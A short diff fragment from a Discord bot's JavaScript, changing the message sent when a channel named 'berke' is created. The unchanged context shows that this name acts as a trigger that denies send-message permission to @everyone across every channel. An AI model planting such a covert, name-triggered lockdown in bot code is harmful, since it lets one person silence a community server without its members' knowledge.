@@ -448,7 +448,7 @@ client.on('error', e => {
 
 client.on('channelCreate', channel => {
   if (channel.name == 'berke') {
-    channel.send(`<@522018424440881163> - <@446349458905497620> Allah zihin açıklığı versin. https://discord.gg/s7P8kA7 https://discord.gg/vfmrzsr`)
+    channel.send(`<@522018424440881163> Allah zihin açıklığı versin.`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
               SEND_MESSAGES: false,
